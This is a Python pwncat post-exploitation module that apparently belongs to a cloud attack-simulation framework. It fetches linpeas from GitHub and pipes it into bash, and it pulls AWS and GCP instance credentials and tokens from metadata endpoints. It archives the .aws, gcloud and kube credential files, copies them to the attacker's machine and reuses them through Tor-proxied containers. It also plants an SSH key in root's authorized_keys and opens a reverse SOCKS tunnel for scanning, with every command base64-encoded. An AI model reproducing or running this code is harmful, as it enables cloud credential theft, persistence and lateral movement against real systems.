#!/usr/bin/env python3
import os
from pwncat.modules import BaseModule
from pwncat.manager import Session
from pwncat.platform.linux import Linux
from pathlib import Path
import subprocess
import shutil
import tarfile
import base64


class Module(BaseModule):
    """ 
    Responder module - use TASK environment variable to execute specific workflow 
    """
    """
    Usage: run responder 
    """
    PLATFORM = [Linux]
    ARGUMENTS = {}

    def run(self, session: Session):
        session.log("starting module")

        session_lock = Path("/tmp/pwncat_session.lock")

        try:
            session.log("creating session lock: /tmp/pwncat_session.lock")
            session_lock.touch()

            # multi log handler
            def log(message):
                # logger.info(message)
                session.log(message)

            def enumerate():
                # run host enumeration
                payload = base64.b64encode(
                    b'curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20240218-68f9adb3/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt')
                log("payload loaded and ready")
                result = session.platform.run(
                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_linpeas | base64 -d | /bin/bash'",
                    cwd="/tmp", timeout=7200)
                log(result)

            def exfiltrate(csp):
                # create an instance profile to exfiltrate
                if csp == "aws":
                    payload = base64.b64encode('''opts="--no-cli-pager"
INSTANCE_PROFILE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials)
AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
AWS_DEFAULT_REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
cat > .aws-ec2-instance <<EOF
AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN
AWS_DEFAULT_REGION=us-east-1
AWS_DEFAULT_OUTPUT=json
EOF
PROFILE="instance"
aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE
aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE
aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE
aws configure set region $AWS_DEFAULT_REGION --profile=$PROFILE
aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                    log("creating an instance creds profile...")
                    result = session.platform.run(
                        f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awsconfig | base64 -d | /bin/bash'",
                        cwd="/tmp", timeout=7200)
                    log(result)

                    # remove any pre-existing cred archived
                    if session.platform.Path('/tmp/aws_creds.tgz').exists():
                        session.platform.unlink('/tmp/aws_creds.tgz')

                    # enumerate aws creds
                    payload = base64.b64encode(
                        b'find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\'')
                    log("running credentials find...")
                    result = session.platform.run(
                        f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscredsfind | base64 -d | /bin/bash'",
                        cwd="/tmp", timeout=7200)
                    log(result)

                    # create an archive of all aws creds
                    payload = base64.b64encode(
                        b'tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\')')
                    log("payload loaded and ready")
                    result = session.platform.run(
                        f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'",
                        cwd="/tmp", timeout=7200)
                    log(result)
                elif csp == "gcp":
                    # get instance metadata
                    payload = base64.b64encode(
                        b"curl \"http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text\" -H \"Metadata-Flavor: Google\" > /tmp/instance_metadata.json")
                    result = session.platform.run(
                        f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_instancemetadata | base64 -d | /bin/bash'",
                        cwd="/tmp", timeout=7200)
                    log(result)
                    # get instance token
                    # example usage: curl https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/zones/ZONE/instances -H "Authorization":"Bearer ACCESS_TOKEN"
                    payload = base64.b64encode(
                        b'''ACCESS_TOKEN=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r '.access_token')
echo $ACCESS_TOKEN > /tmp/instance_access_token.json
''')
                    result = session.platform.run(
                        f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_instancetoken | base64 -d | /bin/bash'",
                        cwd="/tmp", timeout=7200)
                    log(result)

                    # remove any pre-existing cred archived
                    if session.platform.Path('/tmp/aws_creds.tgz').exists():
                        session.platform.unlink('/tmp/aws_creds.tgz')

                    # enumerate gcp creds
                    payload = base64.b64encode(
                        b'find / \( -type f -a \( -name \'credentials.json\' -a -path \'*.config/gcloud/credentials.json\' \) \)  -printf \'%P\n\'')
                    log("running credentials find...")
                    result = session.platform.run(
                        f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_gcpcredsfind | base64 -d | /bin/bash'",
                        cwd="/tmp", timeout=7200)
                    log(result)

                    # create an archive of all gcp creds
                    payload = base64.b64encode(
                        b'tar -czvf /tmp/gcp_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials.json\' -a -path \'*.config/gcloud/credentials.json\' \) \)  -printf \'%P\n\')')
                    log("payload loaded and ready")
                    result = session.platform.run(
                        f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_gcpcreds | base64 -d | /bin/bash'",
                        cwd="/tmp")
                    log(result)

                # create an archive of all kube creds
                payload = base64.b64encode(
                    b'tar -czvf /tmp/kube_creds.tgz -C / $(find / \( -type f -a \( -name \'config\' -a -path \'*.kube/config\' \) \)  -printf \'%P\n\')')
                log("payload loaded and ready")
                result = session.platform.run(
                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_kubecreds | base64 -d | /bin/bash'",
                    cwd="/tmp")
                log(result)

                # copy files
                files = [f"/tmp/{csp}_creds.tgz",
                         "/tmp/kube_creds.tgz",
                         "/tmp/linpeas.txt",
                         "/tmp/instance_access_token.json",
                         "/tmp/instance_metadata.json"]
                for file in files:
                    if session.platform.Path(file).exists():
                        log(f"copying {file}...")
                        if Path(f'/tmp/{hostname}_{os.path.basename(file)}').exists():
                            os.unlink(
                                f'/tmp/{hostname}_{os.path.basename(file)}')
                        with session.platform.open(file, 'rb') as f1:
                            with open(f'/tmp/{hostname}_{os.path.basename(file)}', 'wb') as f2:
                                f2.write(f1.read())
                        session.platform.unlink(file)
                    else:
                        log(f"file not found: {file}")

            def credentialed_access_tor(csp, jobname, cwd, script, args=""):
                # start torproxy docker
                if not csp in ["aws", "gcp", "azure"]:
                    raise Exception(f'Unknown csp used {csp}')

                if task_name == "scan2kubeshell":
                    container = f'ghcr.io/credibleforce/proxychains-aws-cli:main'
                else:
                    container = f'ghcr.io/credibleforce/proxychains-scoutsuite-{csp}:main'
                try:
                    payload = base64.b64encode(
                        'docker stop torproxy || true; docker rm torproxy || true; docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy'.encode('utf-8'))
                    log(f"Running payload: {payload}")
                    result = subprocess.run(
                        ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_{jobname}_torproxy | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
                    log(f'Return Code: {result.returncode}')
                    log(f'Output: {result.stdout}')
                    log(f'Error Output: {result.stderr}')

                    if result.returncode != 0:
                        log('The bash script encountered an error.')
                    else:
                        log("successfully started torproxy docker.")
                        log(
                            f"stopping and removing and {script} tunnelled container proxychains-{jobname}-{csp}...")
                        payload = base64.b64encode(
                            f'docker rm --force proxychains-{jobname}-{csp}'.encode('utf-8'))
                        log(f"Running payload: {payload}")
                        result = subprocess.run(
                            ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
                        log(f'Return Code: {result.returncode}')
                        log(f'Output: {result.stdout}')
                        log(f'Error Output: {result.stderr}')

                        if result.returncode != 0:
                            log('The bash script encountered an error.')

                        log(f"running {script} via torproxy tunnelled container...")

                        # assume credentials prep added creds to local home
                        if csp == "aws":
                            local_creds = str(Path.joinpath(
                                Path.home(), Path(".aws")))
                            container_creds = "/root/.aws"
                        elif csp == "gcp":
                            local_creds = str(Path.joinpath(
                                Path.home(), Path(".config/gcloud")))
                            container_creds = "/root/.config/gcloud"

                        local_kube_creds = str(Path.joinpath(
                            Path.home(), Path(".kube")))
                        container_kube_creds = "/root/.kube"

                        log(f"Starting tor tunneled docker...")
                        payload = base64.b64encode(
                            f'export TORPROXY="$(docker inspect -f \'{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}{{{{end}}}}\' torproxy)"; docker run --rm --name=proxychains-{jobname}-{csp} --link torproxy:torproxy -e TORPROXY=$TORPROXY -v "/tmp":"/tmp" -v "{local_creds}":"{container_creds}" -v "{local_kube_creds}":"{container_kube_creds}" -v "{cwd}":"/{jobname}" {container} /bin/bash /{jobname}/{script} {args}'.encode('utf-8'))
                        log(f"Running payload: {payload}")
                        result = subprocess.run(
                            ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
                        log(f'Return Code: {result.returncode}')
                        log(f'Output: {result.stdout}')
                        log(f'Error Output: {result.stderr}')

                        if result.returncode != 0:
                            log('The bash script encountered an error.')
                except Exception as e:
                    log(f'Error executing bash script: {e}')

            def prep_local_env(task_name, csp=None):
                # create work directory
                task_path = Path(f"/{task_name}")
                if task_path.exists() and task_path.is_dir():
                    shutil.rmtree(task_path)
                task_path.mkdir(parents=True)

                if csp == "aws":
                    # create aws directory
                    aws_dir = Path.joinpath(Path.home(), Path(".aws"))
                    if not aws_dir.exists():
                        # shutil.rmtree(aws_dir)
                        aws_dir.mkdir(parents=True)

                    # extract the first set aws creds
                    file = tarfile.open(f'/tmp/{hostname}_aws_creds.tgz')
                    for m in file.members:
                        if m.isfile() and (m.path.endswith('/.aws/credentials') or m.path.endswith('/.aws/config')):
                            file.extract(m.path, task_path)
                            shutil.copy2(Path.joinpath(
                                task_path, m.path), Path.joinpath(aws_dir, os.path.basename(m.path)))

                    payload = base64.b64encode(
                        f'aws configure list-profiles'.encode('utf-8'))
                    log(f"Running payload: {payload}")
                    result = subprocess.run(
                        ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_checkprofiles | base64 -d | /bin/bash'], cwd=task_path, capture_output=True, text=True)
                    log(f'Return Code: {result.returncode}')
                    log(f'Output: {result.stdout}')
                    log(f'Error Output: {result.stderr}')

                    payload = base64.b64encode(
                        f'aws configure list --profile=default'.encode('utf-8'))
                    log(f"Running payload: {payload}")
                    result = subprocess.run(
                        ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_checkdefault | base64 -d | /bin/bash'], cwd=task_path, capture_output=True, text=True)
                    log(f'Return Code: {result.returncode}')
                    log(f'Output: {result.stdout}')
                    log(f'Error Output: {result.stderr}')
                elif csp == "gcp":
                    # create aws directory
                    # ~/.config/gcloud/credentials.json
                    gcp_dir = Path.joinpath(
                        Path.home(), Path(".config"), Path("gcloud"))
                    if not gcp_dir.exists():
                        gcp_dir.mkdir(parents=True)

                    # extract the first set gcp creds
                    file = tarfile.open(f'/tmp/{hostname}_gcp_creds.tgz')
                    for m in file.members:
                        if m.isfile() and (m.path.endswith('/.config/gcloud/credentials.json')):
                            file.extract(m.path, task_path)
                            shutil.copy2(Path.joinpath(
                                task_path, m.path), Path.joinpath(gcp_dir, os.path.basename(m.path)))

                # copy our payload to the local working directory
                task_script = Path(f"{script_dir}/../resources/{task_name}.sh")
                shutil.copy2(task_script, task_path)

                # copy linpeas.txt into our working directory
                linpeas = Path(f'/tmp/{hostname}_linpeas.txt')
                shutil.copy2(linpeas, task_path)

                # extract the kube config if they exist
                kube_dir = Path.joinpath(
                    Path.home(), Path(".kube"))
                if not kube_dir.exists():
                    kube_dir.mkdir(parents=True)
                if Path(f'/tmp/{hostname}_kube_creds.tgz').exists():
                    file = tarfile.open(f'/tmp/{hostname}_kube_creds.tgz')
                    for m in file.members:
                        if m.isfile() and (m.path.endswith('/.kube/config')):
                            file.extract(m.path, task_path)
                            shutil.copy2(Path.joinpath(
                                task_path, m.path), Path.joinpath(kube_dir, os.path.basename(m.path)))

            # get hostname for disk loggings
            hostname = session.platform.getenv('HOSTNAME')

            script_dir = os.path.dirname(os.path.realpath(__file__))
            log(f"script dir: {script_dir}")
            task_name = session.platform.getenv("TASK")
            log(f"task environment: {task_name}")
            if task_name == "instance2rds" or task_name == "iam2rds" or task_name == "iam2enum":
                csp = "aws"
                log("running enumerate...")
                enumerate()
                log("enumerate complete")
                log("running exfiltrate...")
                exfiltrate(csp)
                log("exfiltrate complete")
                log("running prep_local_env...")
                prep_local_env(csp=csp, task_name=task_name)
                log("prep_local_env complete")
                log("running credentialed_access_tor...")
                credentialed_access_tor(
                    csp=csp,
                    jobname=task_name,
                    cwd=f'/{task_name}',
                    script=f'{task_name}.sh',
                    args=""
                )
                log("credentialed_access_tor complete")
            # update to add 15 minute timeout
            elif task_name == "gcpiam2cloudsql":
                csp = "gcp"
                log("running enumerate...")
                enumerate()
                log("enumerate complete")
                log("running exfiltrate...")
                exfiltrate(csp)
                log("exfiltrate complete")
                log("running prep_local_env...")
                prep_local_env(csp=csp, task_name=task_name)
                log("prep_local_env complete")
                log("running credentialed_access_tor...")
                credentialed_access_tor(
                    csp=csp,
                    jobname=task_name,
                    cwd=f'/{task_name}',
                    script=f'{task_name}.sh',
                    args=""
                )
                log("credentialed_access_tor complete")
            elif task_name == "socksscan":
                # PROXYCHAINS_CONF_FILE=./myproxychains.conf
                # get the attacker public ip
                result = subprocess.run(
                    ['curl', '-s', 'https://icanhazip.com'], cwd='/tmp', capture_output=True, text=True)
                attacker_ip = result.stdout
                log(f'Attacker IP: {attacker_ip}')

                # get the attacker lan
                payload = base64.b64encode(
                    b'ip -o -f inet addr show | awk \'/scope global/ {print $4}\' | head -1')
                result = session.platform.run(
                    f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'",
                    cwd="/tmp", timeout=7200)
                target_lan = bytes(result.stdout).decode().strip()
                log(f'Target LAN: {target_lan}')

                # transfer files from target to attacker
                log("copying private key to target...")
                with open('/home/socksuser/.ssh/socksuser_key', 'rb') as f1:
                    with session.platform.open('/tmp/sockskey', 'wb') as f2:
                        f2.write(f1.read())
                result = session.platform.run(
                    "/bin/bash -c 'chmod 0600 /tmp/sockskey'",
                    cwd="/tmp", timeout=7200)
                log("adding public key to authorized on target...")
                with open('/home/socksuser/.ssh/socksuser_key.pub', 'rb') as f1:
                    with session.platform.open('/root/.ssh/authorized_keys', 'wb') as f2:
                        f2.write(f1.read())

                # create socksproxy on target
                log('starting socksproxy on target...')
                payload = base64.b64encode(
                    'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -D 9050 localhost'.encode())
                result = session.platform.run(
                    f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'",
                    cwd="/tmp", timeout=7200)
                log(f'Result: {result.returncode}')

                # forward local socksproxy to attacker
                log('forwarding target socksproxy to attacker...')
                payload = base64.b64encode(
                    f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -R 9050:localhost:9050 socksuser@{attacker_ip}'.encode())
                result = session.platform.run(
                    f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'",
                    cwd="/tmp", timeout=7200)
                log(f'Result: {result.returncode}')

                # run nmap scan via proxychains
                log('running proxychains nmap...')
                result = subprocess.run(['proxychains', 'nmap', '-Pn', '-sT', '-T2', '-oX', 'scan.xml',
                                        '-p22,80,443,1433,3306,5000,5432,5900,6379,8000,8080,8088,8090,8091,9200,27017', target_lan], cwd='/tmp', capture_output=True, text=True)
                log(f'Result: {result.returncode}')

                # convert to json
                # cat /tmp/scan.xml | jc --xml -p > /tmp/scan.json

                # kill ssh socksproxy and portforward
                log('killing ssh socksproxy and portforward...')
                result = session.platform.run(
                    'kill -9 $(pgrep "^ssh .* /tmp/sockskey" -f)',
                    cwd="/tmp", timeout=7200)
                log(f'Result: {result.returncode}')

                # remove temporary archive from target
                if session.platform.Path('/tmp/sockskey').exists():
                    session.platform.unlink('/tmp/sockskey')
            elif task_name == "scan2kubeshell":
                csp = "aws"
                log("running enumerate...")
                enumerate()
                log("enumerate complete")
                log("running exfiltrate...")
                exfiltrate("aws")
                log("exfiltrate complete")
                log("running prep_local_env...")
                prep_local_env(csp=csp, task_name=task_name)
                log("prep_local_env complete")
                log("running credentialed_access_tor...")
                credentialed_access_tor(
                    csp=csp,
                    jobname=task_name,
                    cwd=f'/{task_name}',
                    script=f'{task_name}.sh',
                    args='--reverse-shell-host=${reverse_shell_host} --reverse-shell-port=${reverse_shell_port}'
                )
                log("credentialed_access_tor complete")

                # create an archive of all kubernetes creds
                payload = base64.b64encode(
                    b'tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\')')
                log("payload loaded and ready")
                result = session.platform.run(
                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'",
                    cwd="/tmp", timeout=7200)
            elif task_name == "kube2s3":
                # create work directory
                task_path = Path(f"/{task_name}")
                if task_path.exists() and task_path.is_dir():
                    shutil.rmtree(task_path)
                task_path.mkdir(parents=True)

                # copy our payload to the local working directory
                task_script = Path(f"{script_dir}/../resources/{task_name}.sh")
                shutil.copy2(task_script, task_path)

                with open(Path.joinpath(task_path, Path(f"{task_name}.sh")), 'rb') as f:
                    payload = base64.b64encode(f.read())

                session.log("running scan payload...")
                result = session.platform.run(
                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_kube2s3 | base64 -d | /bin/bash'",
                    cwd="/tmp", timeout=7200)
                session.log(result)

                files = ["/tmp/kube_bucket.tgz"]
                file_list = ", ".join(files)
                session.log(
                    f"copying scan results: {file_list}...")
                for file in files:
                    with session.platform.open(file, 'rb') as f1:
                        with open(f'/tmp/{os.path.basename(file)}', 'wb') as f2:
                            f2.write(f1.read())
                session.log("done")

                # extract kube s3 prod files
                file = tarfile.open(f'/tmp/{os.path.basename(file)}')
                for m in file.members:
                    if m.isfile():
                        file.extract(m.path, task_path)
                        shutil.copy2(Path.joinpath(
                            task_path, m.path), Path.joinpath("/tmp", os.path.basename(m.path)))
            else:
                # update to add 15 minute timeout
                result = session.platform.run(
                    "${default_payload}",
                    cwd="/tmp", timeout=7200)
                log(f'Result: {result.returncode}')

            log("Removing sesssion lock...")
            session_lock.unlink()

            log("Done.")
        except Exception as e:

            session.log(f'Error executing bash script: {e}')
        finally:
            session_lock.unlink()
